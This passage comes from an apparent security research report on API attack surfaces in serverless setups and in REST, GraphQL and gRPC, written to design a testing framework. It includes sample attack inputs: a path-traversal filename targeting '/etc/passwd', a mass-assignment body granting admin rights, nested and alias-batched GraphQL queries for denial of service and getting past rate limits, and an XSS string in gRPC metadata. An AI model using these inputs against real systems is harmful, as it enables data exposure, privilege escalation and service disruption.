A discovery framework must find every active revision, not only the "latest" URL.

---

### 4.4 Risks specific to serverless

#### 4.4.1 Event injection and trigger abuse

Serverless functions are typically triggered by events (S3 upload, DynamoDB change, HTTP request). An attacker who
controls the event source can manipulate input in unexpected ways.

Example: a Lambda triggered by an S3 `ObjectCreated` event. The attacker uploads a file whose name contains a path
traversal: `../../etc/passwd`. If the function processes the filename without validation, it could read sensitive
files.

#### 4.4.2 Timeout and resource exhaustion

Lambda has configurable limits (maximum timeout 15 minutes, maximum memory 10 GB). An attacker can send crafted
requests that cause slow processing, maxing out the timeout and generating costs.

Example: an API that processes images. The attacker uploads a 10 MB compressed image that decompresses to 1 GB,
causing an OOM or a timeout.

#### 4.4.3 Secret management

Serverless functions need access to secrets (database passwords, API keys). Hard-coding secrets in the code is
unacceptable (leak through the source code). AWS offers Secrets Manager, but it needs configuration: functions must
have the IAM permission `secretsmanager:GetSecretValue`.

A common mistake: logging secrets by accident. CloudWatch Logs (where Lambda logs go) are persistent and accessible
through the AWS console. A `console.log(process.env.DB_PASSWORD)` exposes credentials.

---

## Conclusions of phase 1.A

This analysis of cloud-native architectures for exposing APIs has shown that the attack surface is determined not
only by the APIs themselves but by the infrastructure context they run in. Traditional API gateways centralise control
but create a single point of failure. Kubernetes introduces networking complexity and internal APIs that may be
exposed. Service meshes add security by default but with overhead and misconfiguration risk. Serverless removes server
management but introduces new challenges of execution model and event-driven vulnerabilities.

An effective security testing framework must understand these architectures in depth, recognise which architecture
hosts a target API, and adapt its discovery and testing strategies accordingly. The next phase analyses the API
protocols themselves, then the architecture-protocol interactions where the most insidious blind spots arise.

---

## Technical bibliography (phase 1.A)

### CNCF documentation

- CNCF Cloud Native Glossary - API Gateway: [https://glossary.cncf.io/api-gateway/](https://glossary.cncf.io/api-gateway/)
- Kubernetes Gateway API - Introduction: [https://gateway-api.sigs.k8s.io/](https://gateway-api.sigs.k8s.io/)
- Kubernetes Gateway API - FAQ: [https://gateway-api.sigs.k8s.io/faq/](https://gateway-api.sigs.k8s.io/faq/)
- CNCF Blog - Advancing Open Source Gateways with kgateway: [https://www.cncf.io/blog/2025/02/05/advancing-open-source-gateways-with-kgateway/](https://www.cncf.io/blog/2025/02/05/advancing-open-source-gateways-with-kgateway/)

### AWS Documentation

- AWS Documentation - Amazon API Gateway: [https://docs.aws.amazon.com/apigateway/latest/developerguide/welcome.html](https://docs.aws.amazon.com/apigateway/latest/developerguide/welcome.html)
- AWS Reference Architecture - Multi-region API Gateway with CloudFront: [https://docs.aws.amazon.com/architecture-diagrams/latest/multi-region-api-gateway-with-cloudfront/multi-region-api-gateway-with-cloudfront.html](https://docs.aws.amazon.com/architecture-diagrams/latest/multi-region-api-gateway-with-cloudfront/multi-region-api-gateway-with-cloudfront.html)

### Azure Documentation

- Azure API Management - API Gateway Overview: [https://learn.microsoft.com/en-us/azure/api-management/api-management-gateways-overview](https://learn.microsoft.com/en-us/azure/api-management/api-management-gateways-overview)
- Azure Architecture Center - API Gateways: [https://learn.microsoft.com/en-us/azure/architecture/microservices/design/gateway](https://learn.microsoft.com/en-us/azure/architecture/microservices/design/gateway)

### Google Cloud Documentation

- Google Cloud - API Gateway Architecture Overview: [https://cloud.google.com/api-gateway/docs/architecture-overview](https://cloud.google.com/api-gateway/docs/architecture-overview)
- Google Cloud - About API Gateway: [https://cloud.google.com/api-gateway/docs/about-api-gateway](https://cloud.google.com/api-gateway/docs/about-api-gateway)

### Kong Documentation

- Kong Gateway Documentation: [https://developer.konghq.com/gateway/](https://developer.konghq.com/gateway/)
- GitHub - Kong Repository: [https://github.com/Kong/kong](https://github.com/Kong/kong)
- kgateway Official Site: [https://kgateway.dev/](https://kgateway.dev/)
- kgateway Blog - Advancing Open Source Gateways: [https://kgateway.dev/blog/advancing-open-source-gateways/](https://kgateway.dev/blog/advancing-open-source-gateways/)

### Service Mesh Resources

- Solo.io - Linkerd vs Istio: [https://www.solo.io/topics/istio/linkerd-vs-istio](https://www.solo.io/topics/istio/linkerd-vs-istio)
- Pi Kubernetes Cluster Docs - Service Mesh Istio: [https://picluster.ricsanfre.com/docs/istio/](https://picluster.ricsanfre.com/docs/istio/)
- LiveWyer - Service Meshes Decoded Istio vs Linkerd vs Cilium: [https://livewyer.io/blog/2024/05/08/comparison-of-service-meshes/](https://livewyer.io/blog/2024/05/08/comparison-of-service-meshes/)
- Platform9 - Kubernetes Service Mesh Comparison: [https://platform9.com/blog/kubernetes-service-mesh/](https://platform9.com/blog/kubernetes-service-mesh/)

### Serverless Resources

- Serverless Architecture Patterns - AWS Azure GCP Guide: [https://americanchase.com/serverless-architecture-patterns/](https://americanchase.com/serverless-architecture-patterns/)
- CloudOptimo - AWS Lambda vs Azure Functions vs Google Cloud Functions: [https://www.cloudoptimo.com/blog/aws-lambda-vs-azure-functions-vs-google-cloud-functions-a-detailed-serverless-comparison/](https://www.cloudoptimo.com/blog/aws-lambda-vs-azure-functions-vs-google-cloud-functions-a-detailed-serverless-comparison/)
- Lumigo - AWS Lambda Architecture: [https://lumigo.io/learn/aws-lambda-architecture/](https://lumigo.io/learn/aws-lambda-architecture/)
- GeeksforGeeks - Serverless Architecture: [https://www.geeksforgeeks.org/system-design/serverless-architectures/](https://www.geeksforgeeks.org/system-design/serverless-architectures/)

### Kubernetes Networking

- NGINX Community Blog - Kubernetes Networking: Moving from Ingress to Gateway API: [https://blog.nginx.org/blog/kubernetes-networking-ingress-controller-to-gateway-api](https://blog.nginx.org/blog/kubernetes-networking-ingress-controller-to-gateway-api)
- DigitalOcean Tutorial - Kubernetes Gateway API Tutorial with Cilium: [https://www.digitalocean.com/community/tutorials/kubernetes-gateway-api-tutorial-cilium-ingress-alternative](https://www.digitalocean.com/community/tutorials/kubernetes-gateway-api-tutorial-cilium-ingress-alternative)
- The New Stack - Gateway API or Ingress Developer Guide: [https://thenewstack.io/gateway-api-or-ingress-a-developers-guide-to-kubernetes-routing/](https://thenewstack.io/gateway-api-or-ingress-a-developers-guide-to-kubernetes-routing/)

### Technical Articles & Blogs

- Kong Blog - Building and Securing API Gateway Architecture: [https://konghq.com/blog/learning-center/building-a-secure-api-gateway](https://konghq.com/blog/learning-center/building-a-secure-api-gateway)
- Medium - AWS API Gateway Deep Dive: [https://medium.com/@joudwawad/aws-api-gateway-deep-dive-rest-apis-5ae16a326b3a](https://medium.com/@joudwawad/aws-api-gateway-deep-dive-rest-apis-5ae16a326b3a)
- Medium - Exploring GCP API Gateway with Cloud Functions: [https://medium.com/google-cloud/exploring-google-cloud-api-gateway-with-google-cloud-functions-ff56c1c96cc9](https://medium.com/google-cloud/exploring-google-cloud-api-gateway-with-google-cloud-functions-ff56c1c96cc9)
- DEV Community - Service Mesh Istio Introduction: [https://dev.to/godofgeeks/service-mesh-istio-linkerd-introduction-58pj](https://dev.to/godofgeeks/service-mesh-istio-linkerd-introduction-58pj)

**End of phase 1.A: cloud-native architectures**

# Phase 1.B: API protocols and architectural styles

**Date:** 31 January 2026
**Version:** 3.0 (final version, technical gaps integrated)

---

## Introduction

If architectures define the "where" of APIs (the infrastructure context they run in), protocols define the "what":
the language client and server speak, the conventions that govern the exchange of data, the serialisation and
transport mechanisms. Understanding modern API protocols is essential not only to implement them correctly, but above
all to identify their intrinsic weaknesses.

A common mistake in API security is to treat every protocol as a variant of HTTP with a JSON payload. This
simplification hides deep structural differences with direct consequences on testability and attack surface. A binary
protocol such as gRPC needs completely different testing strategies from GraphQL, which in turn has challenges absent
in REST.

This section analyses six protocols dominant in the 2024-2026 cloud-native landscape: REST (the ubiquitous veteran),
GraphQL (the flexible abstraction), gRPC (the high-performance binary protocol), SOAP (the legacy still in use),
WebSocket (real-time bidirectional communication) and Server-Sent Events (one-way streaming). For each protocol the
structure is the same: first the internal mechanics (how it works technically), then the structural weaknesses (which
risks are intrinsic to the design), and finally the testing challenges (why traditional tools fail).

The goal is not a user manual of the protocols, but a deep understanding of how each protocol's design choices affect
security and call for different testing approaches.

---

## 1. REST (Representational State Transfer)

### 1.1 Protocol mechanics

REST is not technically a protocol in the strict sense, but an architectural style defined by Roy Fielding in his
2000 doctoral dissertation. In common usage, however, "REST API" means an HTTP interface that follows the REST
principles (more or less faithfully).

The foundation of REST is the **resource**: every entity of the system (a user, a product, an order) is identified by
a unique URL and manipulated through standard HTTP methods. GET retrieves a resource's representation, POST creates a
new one, PUT replaces it entirely, PATCH modifies it partially, DELETE removes it. This resource-URL-method mapping
creates a uniform interface that, in theory, should be self-explanatory and predictable.

A fundamental aspect of REST is **statelessness**: each request must carry all the information needed to process it.
The server keeps no session state between requests. Authentication is therefore handled with tokens (typically JWT,
JSON Web Token) included in the HTTP headers of every request, or with cookies the client attaches automatically.

The data format in REST is flexible: although JSON has become dominant, REST natively supports XML, plain text, HTML or
binary formats. **Content negotiation** lets the client state the desired format with the Accept header, and the
server answer with the appropriate Content-Type. This flexibility, while convenient, introduces ambiguity: the same
endpoint can return JSON or XML depending on the client, which complicates testing.

Source: Baeldung, REST vs GraphQL vs gRPC, https://www.baeldung.com/rest-vs-graphql-vs-grpc

The REST communication model:

```
[Client]
    ↓ (HTTP request: GET /users/123)
    ↓ (Headers: Authorization: Bearer <JWT>, Accept: application/json)
[Server]
    ↓ (Parse the request, authenticate by validating the JWT)
    ↓ (Authorization: check that the JWT allows access to user 123)
    ↓ (Business logic: query the database for user ID 123)
    ↓ (Serialise the response as JSON)
[Client]
    ← (HTTP response 200 OK, Content-Type: application/json)
    ← (Body: {"id": 123, "name": "Alice", "email": "alice@example.com"})
```

An often underestimated property of REST is that it **imposes no formal schema**. Unlike protocols such as gRPC (which
needs proto files) or SOAP (which uses WSDL), REST can work with no contract definition. Adopting OpenAPI/Swagger is
voluntary and not enforced at runtime. So an API can return undocumented fields, or omit expected ones, without the
protocol noticing.

### 1.2 Structural weaknesses

REST's architectural characteristics, while flexible, introduce intrinsic weaknesses that follow from its
resource-oriented, schema-optional nature.

#### 1.2.1 Over-fetching and excessive data exposure

REST returns the whole representation of a resource even when the client asks only for some fields. If a client
wants only a user's name, a GET to `/users/123` still returns name, email, date of birth, address, preferences, and
potentially internal fields such as `password_hash` or `internal_id`.

This behaviour, called **over-fetching**, creates a data exposure risk: sensitive fields included in the response by
default can be exposed to clients not authorised to see them. The problem is structural: REST has no native field
selection mechanism. Some APIs implement custom query parameters (for example `/users/123?fields=name,email`), but this
is not a standard feature of the protocol.

Traditional security scanners such as OWASP ZAP or Burp Suite check whether an endpoint is reachable, but do not
analyse whether the response contains more data than least privilege allows. An endpoint may be correctly
authenticated but return the `salary` field that only HR should see, and a generic HTTP scanner would not detect the
violation.

Source: LogRocket blog, GraphQL vs gRPC vs REST, https://blog.logrocket.com/graphql-vs-grpc-vs-rest-choosing-right-api/

#### 1.2.2 Broken object level authorization (BOLA)

REST identifies resources by predictable IDs in the URL: `/users/123`, `/orders/456`. This predictability makes
enumeration easy: an attacker can iterate over sequential IDs (`/users/1`, `/users/2`, ..., `/users/10000`) to access
other users' resources if the backend does not implement fine-grained authorization checks.

BOLA (also known as IDOR, insecure direct object reference) is the number one weakness of the OWASP API Security Top
10. The problem is not technical but in the implementation: REST provides no built-in authorization. The developer is
responsible for checking, on every request, that the authenticated user may access the specific resource.

Testing BOLA requires authenticating as several users and correlating the responses. An automated tool must:

- authenticate as user A;
- request a resource (for example `/orders/789`);
- store the response;
- authenticate as user B;
- request the same resource;
- check whether user B can access a resource that should belong to user A.

This multi-step workflow is not natively supported by generic HTTP scanners.

#### 1.2.3 Mass assignment and parameter pollution

JSON's flexibility lets clients send arbitrary fields in the payload. If the backend deserialises the JSON directly
into database objects without an allow-list, an attacker can inject undocumented fields.

Typical scenario: an API `/users` accepts POST to create users with the fields `username`, `email`, `password`. An
attacker sends:

```json
{
  "username": "attacker",
  "email": "evil@test.com",
  "password": "pass123",
  "is_admin": true
}
```

If the backend maps every JSON field to database columns without validation, the attacker creates an admin account.
This is **mass assignment**, a structural weakness of APIs that do not enforce a schema.

DAST (dynamic application security testing) tools do not detect mass assignment because it would require knowledge of
the internal database schema and of the application logic. A tool would only see "POST successful, user created",
without knowing that the `is_admin` field should not be settable by the client.

#### 1.2.4 HTTP verb tampering

REST assumes that servers check the HTTP method and apply the appropriate logic (GET = read-only, DELETE =
destructive). Misconfigured servers can accept unexpected methods.

Example: the endpoint `/users/123` should support only GET (read) and PATCH (partial update). An attacker tries DELETE
and, if the server does not explicitly refuse unimplemented methods, could delete the resource.

More insidious: some web frameworks treat PUT and POST as interchangeable, or accept a GET with a body (violating the
HTTP specification). This creates an exploitable ambiguity: a firewall might allow GET (assuming it is read-only) while
the server processes the body as a write.

Testing verb tampering requires systematic fuzzing of every HTTP method on every endpoint, checking not only the
status code (200 OK against 405 Method Not Allowed) but also side effects (was the resource changed or deleted?).

#### 1.2.5 Caching issues and information leakage

HTTP caching is designed for performance: proxies, CDNs and browsers cache GET responses to reduce latency. REST uses
this through the `Cache-Control`, `ETag` and `Expires` headers.

The risk appears when responses containing sensitive data are cached by mistake. A typical error: an API returns user
data with `Cache-Control: public, max-age=3600`. A shared proxy (corporate proxy, CDN) caches the response and serves
it to different users, causing information leakage.

This is particularly insidious in APIs that use cookie-based authentication. The browser attaches cookies to requests
automatically, but HTTP proxies see only the URL and the standard headers. If the URL contains no user identifier (for
example `/api/profile` instead of `/api/users/123`), the proxy cannot tell different users' requests apart and serves
the same cached response to all of them.

Detecting caching issues requires analysing the response headers, checking for `Cache-Control: private` on sensitive
endpoints, and testing through intermediary proxies.

### 1.3 Specific testing challenges

REST is the most tested and documented protocol, yet it has specific challenges that follow from its decentralised,
schema-less nature.

#### 1.3.1 Endpoint proliferation and shadow APIs

In REST each resource needs separate endpoints. An average application with 20 entities (User, Product, Order,
Payment, etc.) and versioning (`/v1/`, `/v2/`) can easily have 100+ endpoints. This proliferation makes discovery
difficult.

Shadow APIs are undocumented but still active endpoints: old versions (`/v1/`) not deprecated, debug endpoints
(`/api/debug/users`), forgotten admin endpoints (`/api/admin/backup`). Traditional wordlist-based scanners (Nikto,
Dirb) find only common endpoints. A modern framework must:

- analyse OpenAPI/Swagger files (if available);
- crawl HTML and JavaScript to identify API calls;
- fuzz intelligently based on patterns (if `/users` exists, try `/products`, `/orders`);
- analyse responses for HATEOAS (hypermedia as the engine of application state) links.

HATEOAS is an often ignored REST principle: responses should include links to related resources. Example:

```
GET /users/123

{
  "id": 123,
  "name": "Alice",
  "_links": {
    "orders": "/users/123/orders",
    "profile": "/users/123/profile"
  }
}
```

A crawler can follow these links to discover endpoints. HATEOAS is rarely implemented, however, which makes discovery
harder.

#### 1.3.2 Content negotiation and combinatorial testing

The same endpoint can behave differently based on the Accept header. An endpoint may return JSON for
`Accept: application/json`, XML for `Accept: application/xml`, or HTML for `Accept: text/html`. Each format can go
through different parsers with specific weaknesses (XXE in the XML parser, XSS in HTML rendering).

Complete testing requires testing every endpoint with every supported content type, multiplying the number of tests.
If an API has 100 endpoints and supports 3 formats, 300 tests are needed for basic coverage alone.

#### 1.3.3 HTTP/2 and invisible multiplexing

Modern REST runs over HTTP/2, which introduces **multiplexing**: many requests on a single TCP connection, sent in
parallel. From the point of view of REST as an application protocol nothing changes. But for testing, HTTP/1.1-based
tools (the majority) do not see the multiplexing.

A malicious client can send 1000 simultaneous HTTP/2 requests on one connection, while an HTTP/1.1 monitoring tool
sees only "1 open connection". This hides resource exhaustion attacks and complicates rate limiting (limiting requests
per connection does not work with HTTP/2).

Testing HTTP/2 requires specialised tools (curl with `--http2`, h2load for load testing) and checking that rate
limiting is applied per request, not per connection.

---

## 2. GraphQL

### 2.1 Protocol mechanics

GraphQL changes the REST model by removing the proliferation of endpoints: all interaction goes through a single
endpoint (typically `/graphql`) that accepts queries in a domain-specific language. The client states exactly which
data it wants, and the server returns only that data, solving REST's over-fetching problem.

The protocol rests on a strongly typed **schema** defined in GraphQL SDL (Schema Definition Language). The schema
declares every available type (User, Product, Order), their fields, and the possible operations (query for reading,
mutation for writing, subscription for real-time updates).

An example query asks for a user's name and email and the titles of their posts:

```graphql
query GetUser {
  user(id: "123") {
    name
    email
    posts {
      title
    }
  }
}
```

The server receives this query as a JSON payload in an HTTP POST request:

```
POST /graphql
Content-Type: application/json

{
  "query": "query GetUser { user(id: \"123\") { name email posts { title } } }",
  "variables": {},
  "operationName": "GetUser"
}
```

The GraphQL server processes the query through a structured pipeline:

```
[Client sends query]
    ↓
[GraphQL server - parsing]
    ↓ (Build the abstract syntax tree - AST)
[Validation]
    ↓ (Check that the query is syntactically valid)
    ↓ (Check that the fields exist in the schema)
[Execution]
    ↓ (Resolver for field "user" → database query)
    ↓ (Resolver for field "posts" → posts table query)
    ↓ (Compose the response)
[Response]
    ← (JSON with only the requested fields)
```

**Parsing** turns the query string into an abstract syntax tree, a structured tree representation. The AST is then
validated against the schema: if the query asks for a field that does not exist (for example
`user { invalidField }`), the server returns an error in this phase, before running any logic.

**Execution** is the most complex phase. GraphQL uses **resolver functions**: each schema field has a function that
knows how to fetch that data. The resolver for `user(id: "123")` might run the SQL query
`SELECT * FROM users WHERE id = 123`. The resolver for `posts` (nested inside `user`) receives the user object and runs
another query, `SELECT * FROM posts WHERE user_id = 123`.

Source: Baeldung, REST vs GraphQL vs gRPC, https://www.baeldung.com/rest-vs-graphql-vs-grpc

This resolver-based model introduces the well-known **N+1 problem**: if a query asks for 100 users and the posts of
each, GraphQL runs 1 query for the users + 100 queries for the posts (one per user), 101 database queries in all. The
solution is **DataLoader**, a batching mechanism that accumulates requests and runs them in batches, but it needs an
explicit implementation.

Source: LogRocket blog, GraphQL vs gRPC vs REST, https://blog.logrocket.com/graphql-vs-grpc-vs-rest-choosing-right-api/

GraphQL also supports **introspection**: the client can query the server for the whole schema. This enables tools such
as GraphQL Playground and GraphiQL (interactive IDEs), but exposes the API's full structure to anyone.

### 2.2 Structural weaknesses

GraphQL's power (flexible queries, self-documenting schema) introduces specific risks absent in REST.

#### 2.2.1 Query complexity attacks

GraphQL allows arbitrarily deep nested queries. An attacker can craft queries that explode exponentially:

```graphql
query MaliciousQuery {
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  # ... infinite nesting
                }
              }
            }
          }
        }
      }
    }
  }
}
```

Each nesting level multiplies the number of resolvers executed. A query with 10 nesting levels can generate millions
of database queries, causing denial of service (DoS) and database overload.

The problem is structural: GraphQL imposes no depth or complexity limits by default. The server is responsible for
**query complexity analysis**: assigning a computational cost to each field, computing the query's total cost, and
rejecting queries above a threshold.

Traditional DAST scanners do not understand GraphQL semantics. They cannot build nested queries or compute complexity.
Testing this requires a GraphQL-aware client that generates queries of increasing complexity and measures response
time and server load.

Source: LogRocket blog, GraphQL vs gRPC vs REST, https://blog.logrocket.com/graphql-vs-grpc-vs-rest-choosing-right-api/

#### 2.2.2 Introspection abuse and schema leakage

GraphQL exposes the whole schema through an introspection query:

```graphql
query IntrospectionQuery {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

It returns every type, field and relation. For an attacker it is equivalent to obtaining the source code of the data
structure. Introspection reveals:

- sensitive fields (for example `User.salary`, `User.ssn`);
- admin endpoints (for example `Mutation.deleteAllUsers`);
- hidden relations (for example `User.internalNotes`).

The best practice is to disable introspection in production. Studies document, however, that this mitigation is
**largely ineffective**. Even with introspection disabled, the schema can be rebuilt through **field suggestions**.

When a query asks for a field that does not exist, GraphQL returns a helpful error:

```
query { user { invalidFieldName } }

Error: "Cannot query field 'invalidFieldName' on type 'User'.
        Did you mean 'username', 'email', or 'firstName'?"
```

This usability feature exposes valid fields. An attacker can iterate over common names (id, name, email, password,
admin, etc.) and rebuild the whole schema from the errors. The open source tool **Clairvoyance** automates this.

Source: Cyber Chief, Mastering GraphQL introspection, https://www.cyberchief.ai/2024/11/graphql-security.html

The documentation explicitly confirms: "While disabling introspection may seem like a security measure, it's largely
ineffective. Your GraphQL schema remains discoverable through Field Suggestion".

The problem is structural: GraphQL is designed for developer experience, with detailed errors. Disabling field
suggestions would require generic errors ("invalid query"), degrading the experience for legitimate clients.

#### 2.2.3 Batching and aliasing to bypass rate limiting

GraphQL supports **batching**: sending several queries in a single HTTP request. It also supports **aliasing**:
renaming fields to avoid conflicts.

Combining these features, an attacker can bypass HTTP-based rate limiting:

```graphql
query BatchAttack {
  user1: user(id: 1) { name email }
  user2: user(id: 2) { name email }
  user3: user(id: 3) { name email }
  ...
  user1000: user(id: 1000) { name email }
}
```

This is **a single HTTP POST request**, which a traditional rate limiter counts as "1 request". But the backend runs
1000 queries. If the rate limit is "100 requests per second", the attacker can send 100 batches of 1000 queries =
100,000 operations per second, 1000 times the intended limit.

Source: Escape Tech, How to secure GraphQL APIs, https://escape.tech/blog/how-to-secure-graphql-apis/

Technical documentation confirms: "GraphQL APIs allow batching and aliasing, where multiple queries can be sent in a
single HTTP request. This can be exploited to bypass rate limits set at the gateway or firewall level."

Mitigation requires a GraphQL-aware gateway that counts GraphQL operations, not HTTP requests. But this requires
parsing the payload, computing the computational cost, tracking per client. Traditional infrastructure (Nginx,
standard AWS API Gateway) does not have this capability natively.

#### 2.2.4 Authorization granularity mismatch

REST applies authorization per endpoint: `/users/{id}` can have the policy "a user may access only their own ID".
GraphQL applies authorization per field (field-level authorization).

A GraphQL query can ask for:

```graphql
query {
  user(id: 123) {
    name        # public
    email       # public
    salary      # sensitive - HR only
    ssn         # sensitive - admin only
  }
}
```

The server must check for each field whether the client has permission. If the `salary` resolver implements no
authorization, that field is exposed to unauthorised clients too.

The problem is that authorization is implemented in the application code (resolver functions), not declaratively in
the schema. A developer can forget to add an authorization check to a resolver, exposing the field. Automated scanners
do not detect this because it would require:

- authenticating with different roles (normal user, HR, admin);
- querying the same object with all its fields;
- comparing which fields are returned to each role;
- identifying improperly exposed fields.

This multi-step workflow with correlation between users is not supported by generic DAST tools.

### 2.3 Specific testing challenges

GraphQL needs testing approaches radically different from REST because the attack surface is defined by the schema,
not by URLs.

#### 2.3.1 Schema discovery and coverage

Discovery in GraphQL means obtaining the whole schema. With introspection enabled it is trivial. With it disabled,
field suggestion brute forcing is needed (the Clairvoyance tool).

Once the schema is obtained, coverage means testing:

- every query with every combination of fields;
- every mutation with valid and invalid input;
- every relation (nesting between types).

This is combinatorially explosive. A schema with 50 types and 500 fields in all has billions of possible queries.
Exhaustive testing is impractical. Prioritisation is needed:

- test sensitive fields (password, admin, internal);
- test destructive mutations (delete, update);
- test complex queries (deep nesting).

#### 2.3.2 Mutation testing and side effects

GraphQL mutations change data on the server. Unlike queries (idempotent), mutations have permanent side effects.

Testing mutations requires:

- setting up an initial state (creating test records);
- running the mutation;
- checking the side effect (was the record actually changed?);
- teardown (cleaning up the test data).

This requires integration with the database and complex orchestration. Generic fuzzers that send random input can
damage production databases if not isolated.

#### 2.3.3 Subscriptions and WebSocket

GraphQL subscriptions allow real-time updates through WebSocket. The client subscribes to events:

```graphql
subscription OnCommentAdded {
  commentAdded(postId: "123") {
    id
    content
    author {
      name
    }
  }
}
```

When a new comment is added, the server pushes the update through the WebSocket.

Testing subscriptions requires:

- establishing a persistent WebSocket connection;
- sending the subscription;
- generating the event that triggers it (for example creating a comment);
- checking that the update arrives through the WebSocket.

This event-driven workflow with stateful connections cannot be handled by stateless HTTP scanners.

---

## 3. gRPC

### 3.1 Protocol mechanics

gRPC is a paradigm shift from REST and GraphQL: instead of working with resources or queries, gRPC implements remote
procedure calls (RPC), letting a client invoke functions on a remote server as if they were local.

The protocol rests on two technologies: **HTTP/2** for transport and **Protocol Buffers** (protobuf) for data
serialisation. This combination gives exceptional performance but introduces complexity and opacity.

gRPC development starts by defining a `.proto` file that states the contract:

```protobuf
syntax = "proto3";

message UserRequest {
  int32 user_id = 1;
}

message User {
  int32 id = 1;
  string name = 2;
  string email = 3;
}

service UserService {
  rpc GetUser(UserRequest) returns (User);
}
```

The file is processed by the `protoc` compiler, which automatically generates client and server stubs in several
languages (Go, Java, Python, C++, etc.). The generated code completely hides the serialisation and networking details.

Source: GeeksforGeeks, GraphQL vs REST vs SOAP vs gRPC, https://www.geeksforgeeks.org/blogs/graphql-vs-rest-vs-soap-vs-grpc/

**Protocol Buffers** is a very efficient binary format. Unlike JSON (text-based, verbose), protobuf serialises data in
a compact form using varint encoding (integers in the minimum number of bytes) and field tags (numbers instead of
string names). A protobuf message is typically 3-10 times smaller than the equivalent JSON.

The serialisation process:

```
[User object in memory]
  User { id: 123, name: "Alice", email: "alice@example.com" }
    ↓
[Protobuf encoder]
    ↓ (Field 1 (id): varint 123 → bytes: 08 7B)
    ↓ (Field 2 (name): string "Alice" → bytes: 12 05 41 6C 69 63 65)
    ↓ (Field 3 (email): string → bytes: ...)
[Binary payload]
  08 7B 12 05 41 6C 69 63 65 1A 13 61 6C 69 63 65 40 65 78 61 6D 70 6C 65 2E 63 6F 6D
```

This binary payload is not human-readable, but it is processed in microseconds with minimal memory allocation.

**HTTP/2** provides the transport layer. gRPC uses HTTP/2 multiplexing (many simultaneous requests on one TCP
connection), server push, and header compression (HPACK).

A gRPC request:

```
[gRPC client]
    ↓ (Serialise the request as protobuf binary)
[HTTP/2 stream]
    ↓ (HEADERS frame: :method POST, :path /UserService/GetUser)
    ↓ (DATA frame: protobuf payload)
    ↓ (TLS encryption mandatory in production)
[gRPC server]
    ↓ (Deserialise protobuf)
    ↓ (Run the business logic)
    ↓ (Serialise the response)
[Client]
    ← (HTTP/2 DATA frame with the protobuf response)
```

gRPC supports four kinds of communication:

**Unary RPC**: the client sends one request, the server returns one response (like REST).

**Server streaming**: the client sends one request, the server returns a stream of responses (for example chunked file
download, log streaming).

**Client streaming**: the client sends a stream of requests, the server returns one response (for example file
upload).

**Bidirectional streaming**: client and server send streams in both directions at the same time (for example chat,
real-time gaming).

Source: Baeldung, REST vs GraphQL vs gRPC, https://www.baeldung.com/rest-vs-graphql-vs-grpc

### 3.2 Structural weaknesses

gRPC's binary, stream-oriented nature introduces structural weaknesses different from text-based protocols.

#### 3.2.1 Deserialisation attacks

Protobuf, like every serialisation format, is vulnerable to attacks if the payload is maliciously crafted. Documented
CVEs include:

**CVE-2021-22570**: heap overflow in the protobuf C++ parser. A malformed payload with a very large field tag caused a
buffer overflow, potentially allowing remote code execution.

**CVE-2022-1941**: denial of service in the protobuf C++ parser. Payloads with deeply nested messages caused a stack
overflow.

Source: CVE database, https://cve.mitre.org/

These attacks exploit parser bugs, but the fundamental problem is that binary protobuf is opaque. A WAF (web
application firewall) or IDS (intrusion detection system) cannot inspect the payload without fully deserialising it.
So malicious payloads pass unnoticed through traditional security layers.

In addition, unlike JSON (where a strict parser rejects syntax errors), protobuf has **unknown fields**: if a message
contains field tags not defined in the schema, the parser silently ignores them. This was a feature for backward
compatibility (adding fields without breaking old clients), but it can hide injection attempts.

#### 3.2.2 Stream exhaustion and resource leaks

gRPC streaming allows long-lived connections with unlimited messages. A malicious client can open bidirectional
streams and send messages forever without ever closing them, causing resource exhaustion.

HTTP/2 provides **flow control** to prevent this: each stream has a credit window (WINDOW_UPDATE frames) that limits how
much data can be sent before an acknowledgement. Flow control configuration is complex, however, and often left at
permissive defaults.

An attacker can:

- open N parallel streams (HTTP/2 allows up to 128 concurrent streams per connection by default);
- send messages slowly (under the rate limit of each stream);
- but generate high traffic overall (N streams × messages per stream).

Servers that implement no timeout on the stream lifetime or limit on the total number of messages per stream are
vulnerable.

Source: LogRocket blog, GraphQL vs gRPC vs REST, https://blog.logrocket.com/graphql-vs-grpc-vs-rest-choosing-right-api/

#### 3.2.3 Metadata injection

gRPC metadata (the equivalent of HTTP headers) can carry injection attacks. Metadata are arbitrary key-value pairs sent
with every request:

```
metadata = {
  "authorization": "Bearer <JWT>",
  "x-custom-header": "<script>alert(1)</script>"
}
```

If the server logs metadata without sanitisation, it is vulnerable to log injection. If metadata are reflected in an
HTML response, it is vulnerable to XSS. These are classic attacks, made worse because the protobuf payload is binary
and security tools concentrate on it, neglecting the text-based metadata.

#### 3.2.4 Authentication bypass

gRPC has no native authentication. The developer must implement it, typically with a JWT in the metadata. A common
mistake is to validate the token only on some RPC methods, not all.

Example: `GetUser` requires authentication, but `ListPublicUsers` does not. An attacker could call `ListPublicUsers`
without a token and obtain data thought to be public but containing PII (personally identifiable information).

In addition, gRPC has no standard mechanism for session management or token refresh. Developers implement custom
solutions, often with vulnerabilities.

### 3.3 Specific testing challenges

gRPC is the hardest protocol to test with traditional tools because it requires specialised capabilities.

#### 3.3.1 Binary protocol opacity

Burp Suite and OWASP ZAP are designed for text-based HTTP/1.1. They see gRPC traffic as incomprehensible binary
streams. Burp has plugins to decode protobuf, but they need the `.proto` file, which may not be available.

Without the schema, a tester sees only:

```
POST /UserService/GetUser
Content-Type: application/grpc

[binary data: 08 7B 12 05 ...]
```

They cannot tell which fields exist, which values are valid, how to build test payloads. This makes fuzzing almost
impossible: random bytes always produce deserialisation errors and reveal no logic flaw.

#### 3.3.2 Discovery through the reflection API

gRPC supports **server reflection**: the server can expose its schema (the equivalent of GraphQL introspection). The
`grpcurl` tool uses reflection to list services and methods:

```
grpcurl -plaintext localhost:9090 list
# Output:
grpc.reflection.v1alpha.ServerReflection
UserService
```

Reflection is, however, **disabled by default in production** (security best practice). Without reflection, discovery
requires:

- obtaining the `.proto` files from a Git repository (if accessible);
- reverse engineering client binaries;
- social engineering (asking the developers).

There is no automated solution for discovery without reflection.

Source: gRPC documentation, server reflection, https://grpc.io/docs/guides/reflection/

#### 3.3.3 TLS enforcement and MITM

Production gRPC **always** uses TLS (plain text is only for development). This prevents MITM (man in the middle)
attacks, but complicates testing.

Tools like Burp require:

- installing Burp's certificate as trusted on the client;
- configuring the gRPC client to accept custom certificates;
- intercepting traffic with TLS decryption.

